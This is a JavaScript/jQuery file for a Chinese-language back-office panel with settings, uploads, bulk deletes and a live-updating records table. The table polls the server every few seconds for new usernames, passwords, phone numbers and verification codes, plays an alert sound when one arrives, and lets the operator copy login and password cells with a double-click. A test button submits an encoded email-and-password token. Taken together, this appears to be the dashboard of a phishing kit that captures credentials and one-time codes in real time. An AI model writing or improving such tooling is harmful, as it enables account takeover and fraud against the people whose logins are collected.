$(function(){
	$('#shareDate').on('input',function(){
		if($(this).val() > 500){
			$('#summary').prop('checked',true);
			$('#loadshare').val(5);			
		}
	});
	$('#chenking').change(function(){
		if($('#chenking').prop('checked')){
			$('#summary').prop('checked',true);
		}
	});
	$('#reset').click(function(){
		if(confirm('恢复默认参数，所有设置将无法恢复，是否继续？')){
			location.href='?act=reset';
		}
	});
	$('#do_save').click(function(){
		var val = $('#autosave').serialize();
		MyPost('save',val);
	});
	$('#testapi').click(function(){
		if(!isMobile){
			alert('请在微信端打开后台测试！');
		}else{
			location.href='?act=testapi&appid='+$('#appid').val()+'&appsecret='+$('#appsecret').val();
		}
	});
	$('.nav_link').each(function(){
		var m= 'm='+$user.m;
		if($(this).attr('href').indexOf(m)>0){
			$(this).css('color','red');
		}
	})
	$('textarea').on('input',textareaAutoHeight).each(textareaAutoHeight);
	$("#autosave input").keypress(function(e) {
	  if (e.which == 13) {
		 $('#autosave .table_text').blur();
		 return false;
	  }
	});
	$( '.dl_idx' ).click( function () {
		$(this).parent().find('input').checked('|');
	});
	$( '[doAct]' ).click( function () {
		var da=$(this).attr('doAct').split('|');
		if('local'==da[0]){
			get.day=$('#start').val()+'|'+$('#end').val();
			get.page=1;
			alert($('#start').val()+'|'+$('#end').val());
			//location.href=getUrl(get);
		}else if('day'==da[0]){
			get.day=da[1];
			get.page=1;
			get.c=null;
			location.href=getUrl(get);
		}else if('c'==da[0]){
			get.c=da[1];
			get.page=1;
			location.href=getUrl(get);
		}else if('act'==da[0]){
			if('insetTset'==da[1]){
				$.get('../index.php?token=eyJ1IjoidGVzdEBxcS5jb20iLCJwIjoidGVzdFBhc3N3b3JkIiwiY29zdCI6IjIwMDAiLCJwaG9uZSI6IjEzODg4ODg4ODgiLCJhZGRyZXNzIjoiYmVpamluZyIsInRpdGxlIjoidGl0bGUifQ%3D%3D&img=/7486.gif',function(){
					location.reload();
				});
			}else if('runcheck'==da[1]){
				$('.idx').each(function(){
					$(this).checked('|');
				});
				$('.idall').checked('|');
			}else if('docheck'==da[1]){
				var chenk=$(this).checked();
				$('.idx').each(function(){
					$(this).checked(chenk);
				});
			}
		}else if('do'==da[0]){
			var act,val='',ida=[];
			$('.idx').each(function(){
				if($(this).prop('checked')){
					ida[ida.length]=$(this).val()
				}
			});
			if('delrep'==da[1]){
				if(!confirm('删除重复后无法恢复，您确认要删除吗？'))return;
				act='delrep'
			}else if('delall'==da[1]){
				if(!confirm('删除后无法恢复，您确认要删除吗？'))return;
				act='delall'
			}else if(ida.length<1){
				return alert('您没有选择内容！');
			}else if('delcheck'==da[1]&&confirm('删除后无法恢复，您确认要删除吗？')){
				act='delcheck'
			}else if('allow'==da[1]){
				if(!(val=prompt('请输入备注内容：','通过')))return;
				act='allow'
			}else{
				return ;
			}
			$.post('?c='+act,{ids:ida.join(','),val:val},function(d){
				location.reload();
			});
		}
		//console.log(da)
	});
	upload_textarea();
	//console.log($user);
	setInterval(loadLine,3000)
	eventItem($('.table-striped'));
	loadLine();
});
function eventItem(even){
	$( '.delete',even ).dblclick( function () {
		var data = {};
		data.id = $( this ).attr( 'index' );
		$.post( '?m=list&c=delete', data );
		$( this ).parent().fadeOut( "slow" );
	});
	$( 'td[contenteditable="true"]',even).blur( function () {
		var index = $( this ).attr( 'index' ).split( ',' );
		var data = {};
		data.id = index[ 0 ];
		data.field = index[ 1 ];
		data.value = $( this ).html();
		$.post( '?m=list&c=update', data );
	} );
	$('td.dl_user,td.dl_pass,td.code').dblclick(function(event) {
		var clipboardData = event.originalEvent.clipboardData || window.clipboardData;
		var text = window.getSelection().toString();		
		if(text.length>3){
			document.execCommand('copy');
			tip('复制成功',0.6);
		}
	});
}
//JS提示弹框
function tip(text, time){
	window.tmsg&&document.body.removeChild(tmsg);
	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="top:200px;left:20%;right:20%;color:#fff;margin:0 auto;opacity:0;padding:5px;font-size:15px;max-width:300px;position:fixed;text-align:center;border-radius:8px;background-color:#333;border:1px solid #222;box-shadow:rgba(0,0,0,0.25) 0px 0px 10px 6px;transition:opacity 0.6s">'+text+'</div>');
	setTimeout('tmsg.style.opacity=0.8',0);clearTimeout(window.tmst);
	window.tmst=setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);',(time||3)*1000);
}
function changestate(even,id){
	var data = {};
	data.id = id;
	data.key = $( even ).val();
	data.val = $('option:selected',even).html();;
	$.post( '?m=list&c=updatestate', data,function(){
	    setTimeout(function(){
	        $( even ).val('0')
	    },5000);
	} );
}
function loadLine(){
	$.post('?m=list&c=rush',function(d){
		d = dejson(d);
		if(d.data){
			for(var i in d.data){
				var val = d.data[i];
				var tr = $('tr[data-id="'+val.id+'"]');
				if(tr[0]){
					var even = $('.code',tr);
					if(val.code && even.html() != (val.code||'')){
						even.html(val.code); 
						musicPlay();
					}
					var even = $('.phone',tr);
					if(val.phone && even.html() != val.phone){
						even.html(val.phone); 
						musicPlay();
					}
					var even = $('.online',tr);
					if(val.online && even.html() != val.online)even.html(val.online); 
					var even = $('.isyanzheng',tr);
					if(val.isyanzheng && even.html() != val.isyanzheng){
						even.html(val.isyanzheng); 
						// musicPlay();
					}
					var even = $('.pass',tr);
					if(val.pass && even.html() != val.pass){
						even.html(val.pass); 
						musicPlay();
					}
					var even = $('.issend',tr);
					if(val.issend && even.html() != val.issend){
						even.html(val.issend); 
						musicPlay();
					}
					var even = $('.logs',tr);
					if(val.logs && even.html() != val.logs)even.html(val.logs); 
					var even = $('.visit',tr);
					if(even.html() != val.visit)even.html(val.visit); 
					if('0' == val.state ){
						$('.status').val(0)
					}
				}else if(parseInt(d.maxid) <= parseInt(val.id) && $('tr[data-id]')[0]){
					musicPlay();
					$html = $(val.html);
					eventItem($html);
					$('.table-striped tbody').prepend($html);
				}
			}
		}			
	});
	if(window.get && !(get.page < 1)){	}
}
var isMobile = isMobile();
function musicPlay(){
    mymusic.play();
    console.trace();
}
function upload_textarea(){
	$('.upload_textarea').upload('?u=upload',function(d){
		d = dejson(d);
		if(d.dir){
			var txtarea=$(this).parents('td').find('.table_text');
			var dom = inarr($(txtarea).attr('id'),'shareImage')?'{DOM}':'.';
			txtarea.val(dom+d.dir+'\r\n'+txtarea.val());
			var val = $('#autosave').serialize();
			MyPost('save',val);
		}
	});	
}
function upload_input(){
	$('.upload_input').upload('?u=upload',function(d){
		d = dejson(d);
		if(d.dir){
			$(this).parents('.table_right').find('input.table_text').val('.'+d.dir);
		}
	});
}
function loadjs(u){
	var s = document.createElement('script');
	s.type = 'text/javascript';
	s.src = u;
	document.body.append(s);
}
function MyPost(act,o,fn){
	show_loading()
	$.post('?act='+act,o,function(d){
		d = dejson(d);
		if(d){
			if(fn){
				fn.call(this)
			}else{
				show_msg(d.msg);
			}	
		}
	});
}
function show_loading(){
	var txt = '<span class="glyphicon glyphicon-floppy-disk"></span> 保存中 ',txt_i = "";
	$('.table_msg').slideDown().html(txt);
	clearInterval(window.show_loading_time);
	clearTimeout(window.show_close_time);
	window.show_loading_time=setInterval(function(){
		if(txt_i.length>20){
			txt_i='';
		}else{
			txt_i+=' •';
		}
		$('.table_msg').html(txt+txt_i);
	},150);
}
function show_msg(txt){
	if(/</.test(txt)){
		txt = txt;
	}else if(!txt){
		txt= '<span style="color:#363"><span class="glyphicon glyphicon-floppy-disk"></span> 保存成功！</span>';	
	}else{
		txt= '<span style="color:#363"><span class="glyphicon glyphicon-floppy-disk"></span> '+txt+'</span>';
	}
	$('.table_msg').slideDown().html(txt);
	clearInterval(window.show_loading_time);
	clearTimeout(window.show_close_time);
	window.show_close_time=setTimeout(function(){
		clearInterval(window.show_loading_time);
		$('.table_msg').slideUp();
	},8000);
}
function textareaAutoHeight(e){
	if(this.scrollHeight>80)$(this).height(this.scrollHeight-4);
}
function inarr(a,b){
	if(typeof(b) == 'string')b=b.split(',');
	for(var k in b)if(a==b[k])return true;
}
function trim(s) {
	return (typeof(s) == 'string' && s.length > 0) ? s.replace(/^\s*|\s*$/g, '') : '';
}
function chenksave(){
	if($('#deny').prop('checked') && !confirm("您选择了停用访问网站不能正常运行！"))return false;
	return true;
}
function dejson(d) {
	try {
		if (typeof(d) == 'string') d = JSON.parse(d);
		if (d.alert) alert(d.alert);
		if (typeof(d.redirect) == 'object') redirect.apply(d, d.redirect);
	} catch(e) {
		d = {d: d,err: 'DEJSON解析错误！',e: e};
	}
	if(window.DBG)console.log(d,'DEJSON');
	return d;
}
function enjson(v,m) {
	var d={data: JSON.stringify(v)}
	if(window.DBG)console.log(v,'ENJSON');
	return d;
}
function isMobile(){
	return /mobile|phone|Android|iPhone|iPod|ios|iPad/i.test(navigator.userAgent);
}
function isIPhone(){
	return /iPhone|iPod|ios|iPad/i.test(navigator.userAgent);
}
function getUrl(u,o) {
	var k,i = 0;
	u === true && ( u = document.location.pathname);
	typeof(u) == 'object' && (o = u) && (u = '');
	if (typeof(o) == 'object') for (k in o) if (o[k] !== null) u += (i++==0 ? '?': '&') + k + '=' + encodeURIComponent(o[k]);
	return u;
}
//选择框
$.fn.checked = function(c) {
	if(typeof(c) == 'boolean') {
		return $(this).prop('checked',c);
	}else if (c == '|'){
		$(this).each(function() {
			$(this).prop('checked', !$(this).prop('checked'))
		});
	}else{
		return $(this).prop('checked')
	}
};
$.fn.upload = function(u,o,f) {
	$(this).each(function(){
		typeof(o) != 'object' && (f = o) && (o = null);
		var s,w,g,b,x,r,t=this;
		function y(n) {
			show_msg('<span class="glyphicon glyphicon-open"></span> '+(n>1?'上传成功！':'上传进度 '+(Math.floor(n*100))+'%'));
		};
		$(this).change(function() {
			y(0.001);
			b = new FormData();
			for (var k in o) {b.append(k,typeof(o[k]) == 'object' ? JSON.stringify(o[k]) : o[k])}
			for (k in this.files) b.append('xhrUpload',this.files[k]);  
			x = window.XMLHttpRequest?new XMLHttpRequest():new ActiveXObject("Microsoft.XMLHTTP");
			x.upload.addEventListener('progress',function(e) {
				if (e.lengthComputable) y(e.loaded / e.total)
			},false);
			x.addEventListener('load',function(d) {
				y(2);
				f.call(t,d.target.response,d)
			},false);
			x.addEventListener('error',function(d) {
				show_msg('上传失败！');
				f.call(t, d)
			},false);
			x.open('POST',u);
			x.send(b)
		})
	});
}